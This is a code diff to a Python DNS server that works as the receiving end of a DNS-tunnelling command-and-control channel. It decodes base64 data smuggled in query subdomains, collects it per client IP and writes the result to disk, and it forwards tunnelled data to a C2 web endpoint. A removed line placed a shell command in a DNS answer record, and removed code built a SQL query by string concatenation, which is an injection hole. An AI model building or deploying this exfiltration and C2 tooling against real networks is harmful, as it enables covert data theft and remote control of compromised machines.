@@ -14,17 +14,15 @@ DOMAIN_TO_IP = {
 
 DJANGO_SERVER = "http://127.0.0.1:8000"
 
-def write_to_bufDB(ip, resp_data):
-    conn = sqlite3.connect('dns.db')
-    cursor = conn.cursor()
-    cursor.execute("INSERT INTO dns_responses VALUES (?,?)",(ip, resp_data))
+BUFFER = {}
 
-def join_data(ip):
-    conn = sqlite3.connect('dns.db')
-    cursor = conn.cursor()
-    cursor.execute("SELECT response FROM dns_responses WHERE ip="+ip+";")
-    print(cursor.fetchall())
-
+def write_to_disk(ip):
+    base64_encoded_data = BUFFER[ip]
+    data = base64.b64decode(base64_encoded_data)
+    with open('tmp001', 'wb') as obj:
+        obj.write(data)
+    BUFFER.pop(ip)
+    return
 
 def send_to_C2(ip, resp_data):
     url = f"{DJANGO_SERVER}/dns_tun"
@@ -62,11 +60,25 @@ class DNSHandler(socketserver.BaseRequestHandler):
             qname = str(request.q.qname)
 
             # send tunnelled data to C2
-            tunnelled_data = base64.b64decode(qname.split('.')[0])
-            tunnelled_data = tunnelled_data.decode()
+            tunnelled_data = qname.split('.')[0]
+            print(tunnelled_data)
+            try:
+                if base64.b64decode(tunnelled_data).decode() == "#END#":
+                    write_to_disk(self.client_address[0])
+            except Exception as e:
+                pass
+            
+            if self.client_address[0] not in BUFFER.keys():
+                BUFFER[self.client_address[0]] = tunnelled_data 
+            else:
+                BUFFER[self.client_address[0]] += tunnelled_data
+
+            '''            
             if tunnelled_data == "#END#":
                 join_data(self.client_address[0])
-
+            else:
+                write_to_bufDB(self.client_address[0], tunnelled_data)
+            '''
             #send_to_db(ip=self.client_address[0], resp_data=tunnelled_data)
 
             qname = ('.'.join(str(request.q.qname).split('.')[1:]))[:-1]
@@ -76,14 +88,14 @@ class DNSHandler(socketserver.BaseRequestHandler):
                 # RR - resource records
                 # RR Class Contains RR header and RD (resource data) instance
                 # qname, QTYPE.A, rdata=A(DOMAIN_TO_IP[qname]
-                reply.add_answer(RR(rname="a.com",  rtype=QTYPE.A, rdata="cd ../../Downloads###"))
+                reply.add_answer(RR(rname="a.com",  rtype=QTYPE.A, rdata=A(DOMAIN_TO_IP[qname])))
                 print(f"Resolved {qname} to {DOMAIN_TO_IP[qname]}")
             else:
                 print(f"No record found for {qname}")
             socket.sendto(reply.pack(), self.client_address)
 
         except Exception as e:
-            print(f"Error handling UDP request -> {e}")
+            print(f"Error in handle -> {e}")
 
 if __name__ == "__main__":
     # SKELETON - socketserver.UDPServer((HOST, PORT), MyUDPHandler)
